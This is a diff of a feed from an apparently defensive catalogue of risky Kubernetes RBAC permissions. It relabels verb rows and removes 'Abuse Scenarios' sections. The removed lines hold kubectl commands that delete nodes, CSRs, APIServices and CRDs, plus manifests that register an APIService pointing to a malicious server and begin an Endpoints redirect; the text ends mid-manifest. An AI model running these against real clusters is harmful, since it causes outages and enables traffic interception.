@@ -37,8 +37,8 @@
  &lt;td>certificatesigningrequests/approval&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -90,8 +90,8 @@
  &lt;td>clusterroles&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>bind&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[bind]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -143,8 +143,8 @@
  &lt;td>pods/attach&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -204,8 +204,8 @@
  &lt;td>pods/exec&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -273,8 +273,8 @@
  &lt;td>pods/portforward&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -334,8 +334,8 @@
  &lt;td>certificatesigningrequests&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -397,8 +397,8 @@
  &lt;td>localsubjectaccessreviews&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -460,8 +460,8 @@
  &lt;td>pods&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -513,8 +513,8 @@
  &lt;td>pods&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -566,8 +566,8 @@
  &lt;td>selfsubjectrulesreviews&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -619,8 +619,8 @@
  &lt;td>serviceaccounts/token&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -685,8 +685,8 @@
  &lt;td>serviceaccounts/token&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -739,8 +739,8 @@
  &lt;td>subjectaccessreviews&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -802,8 +802,8 @@
  &lt;td>tokenreviews&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -854,8 +854,8 @@
  &lt;td>controllerrevisions&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -923,8 +923,8 @@
  &lt;td>namespaces&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -982,8 +982,8 @@
  &lt;td>nodes&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>delete, deletecollection&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[delete] · [deletecollection]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -995,14 +995,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants permission to delete nodes from the cluster. This can lead to a severe denial of service by removing compute capacity, disrupting running applications, and potentially causing data loss for workloads not designed for sudden node disappearance.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Delete a specific node from the cluster.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete node &amp;lt;node-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete node minikube&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Escalate privileges via ClusterRoles (escalate verb)</title><link>https://rbac-atlas.github.io/rules/1031/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1031/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants permission to delete nodes from the cluster. This can lead to a severe denial of service by removing compute capacity, disrupting running applications, and potentially causing data loss for workloads not designed for sudden node disappearance.&lt;/p></description></item><item><title>Escalate privileges via ClusterRoles (escalate verb)</title><link>https://rbac-atlas.github.io/rules/1031/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1031/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -1041,8 +1034,8 @@
  &lt;td>clusterroles&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>escalate&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[escalate]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1093,8 +1086,8 @@
  &lt;td>pods/eviction&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1160,8 +1153,8 @@
  &lt;td>pods/eviction&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1222,8 +1215,8 @@
  &lt;td>users, groups, serviceaccounts, userextras, uids&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>impersonate&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[impersonate]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1275,8 +1268,8 @@
  &lt;td>mutatingwebhookconfigurations&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[list] · [watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1333,8 +1326,8 @@
  &lt;td>namespaces&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[list] · [watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1391,8 +1384,8 @@
  &lt;td>validatingwebhookconfigurations&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[list] · [watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1449,8 +1442,8 @@
  &lt;td>certificatesigningrequests&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get] · [list] · [watch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1462,18 +1455,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Permits viewing, listing, watching, or deleting CertificateSigningRequests. Viewing CSRs can disclose information about pending certificate requests. Deleting CSRs can cause denial of service by preventing legitimate certificates from being issued or renewed.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>List all CertificateSigningRequests.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get csr
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete a specific CertificateSigningRequest, preventing certificate issuance.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete csr &amp;lt;csr-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete csr my-app-csr&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage APIServices</title><link>https://rbac-atlas.github.io/rules/1046/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1046/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Permits viewing, listing, watching, or deleting CertificateSigningRequests. Viewing CSRs can disclose information about pending certificate requests. Deleting CSRs can cause denial of service by preventing legitimate certificates from being issued or renewed.&lt;/p></description></item><item><title>Manage APIServices</title><link>https://rbac-atlas.github.io/rules/1046/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1046/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -1512,8 +1494,8 @@
  &lt;td>apiservices&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1527,33 +1509,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants control over APIServices, which register aggregated API servers. This is highly critical as an attacker can redirect API requests to a malicious server, intercept traffic, escalate privileges, cause denial of service, or exfiltrate information.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new APIService to redirect API calls to a malicious server.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apiregistration.k8s.io/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: APIService
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: v1alpha1.attacker.com
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> service:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: &amp;lt;malicious-service-name&amp;gt;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> namespace: &amp;lt;malicious-service-namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> group: attacker.com
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> version: v1alpha1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> caBundle: &amp;lt;base64-encoded-ca-cert&amp;gt; # CA for the malicious service
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> groupPriorityMinimum: 2000 # Higher than core APIs
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> versionPriority: 200
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete an existing APIService, disrupting aggregated API functionality.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete apiservice &amp;lt;apiservice-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete apiservice v1beta1.metrics.k8s.io&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ArgoCD Applications (argoproj.io)</title><link>https://rbac-atlas.github.io/rules/1063/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1063/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants control over APIServices, which register aggregated API servers. This is highly critical as an attacker can redirect API requests to a malicious server, intercept traffic, escalate privileges, cause denial of service, or exfiltrate information.&lt;/p></description></item><item><title>Manage ArgoCD Applications (argoproj.io)</title><link>https://rbac-atlas.github.io/rules/1063/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1063/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -1592,8 +1548,8 @@
  &lt;td>applications&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete, sync&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete] · [sync]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1645,8 +1601,8 @@
  &lt;td>ciliumclusterwidenetworkpolicies&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1698,8 +1654,8 @@
  &lt;td>clusterissuers&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1751,8 +1707,8 @@
  &lt;td>clusterrolebindings&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1804,8 +1760,8 @@
  &lt;td>clusterroles&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1856,8 +1812,8 @@
  &lt;td>cronjobs&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1909,8 +1865,8 @@
  &lt;td>cronjobs&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -1962,8 +1918,8 @@
  &lt;td>csidrivers&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2015,8 +1971,8 @@
  &lt;td>customresourcedefinitions&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2028,43 +1984,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Permits creating, updating, or deleting CustomResourceDefinitions (CRDs). CRDs extend the Kubernetes API. Modifying CRDs can lead to tampering with custom controllers, potentially causing unexpected behavior, privilege escalation if controllers manage sensitive resources, or denial of service.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new CustomResourceDefinition for a malicious custom resource.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apiextensions.k8s.io/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: CustomResourceDefinition
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: maliciousconfigs.attacker.com
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> group: attacker.com
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> versions:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> served: true
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> storage: true
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> schema:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> openAPIV3Schema:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: object
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> properties:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: object
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> x-kubernetes-preserve-unknown-fields: true
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> scope: Namespaced
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> names:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> plural: maliciousconfigs
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> singular: maliciousconfig
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> kind: MaliciousConfig
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> shortNames: [&amp;#34;mc&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete an existing CustomResourceDefinition, disrupting custom controllers.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete crd &amp;lt;crd-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete crd applications.argoproj.io&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage DaemonSets cluster-wide (runs on all nodes, high impact)</title><link>https://rbac-atlas.github.io/rules/1035/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1035/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Permits creating, updating, or deleting CustomResourceDefinitions (CRDs). CRDs extend the Kubernetes API. Modifying CRDs can lead to tampering with custom controllers, potentially causing unexpected behavior, privilege escalation if controllers manage sensitive resources, or denial of service.&lt;/p></description></item><item><title>Manage DaemonSets cluster-wide (runs on all nodes, high impact)</title><link>https://rbac-atlas.github.io/rules/1035/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1035/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -2103,8 +2023,8 @@
  &lt;td>daemonsets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2157,8 +2077,8 @@
  &lt;td>daemonsets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2211,8 +2131,8 @@
  &lt;td>deployments&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2264,8 +2184,8 @@
  &lt;td>deployments&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2317,8 +2237,8 @@
  &lt;td>endpoints, endpointslices&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete, get, list&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete] · [get] · [list]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2371,8 +2291,8 @@
  &lt;td>endpoints, endpointslices&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete, get, list&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete] · [get] · [list]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -2385,29 +2305,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Permits creating, updating, or deleting Endpoints/EndpointSlices for services within a specific namespace. This can lead to traffic redirection, denial of service, or network policy bypass for applications within that namespace.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new Endpoint to redirect traffic for a service in the namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: Endpoints
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: &amp;lt;service-name&amp;gt; # Must match an existing service name
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">subsets:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - addresses:
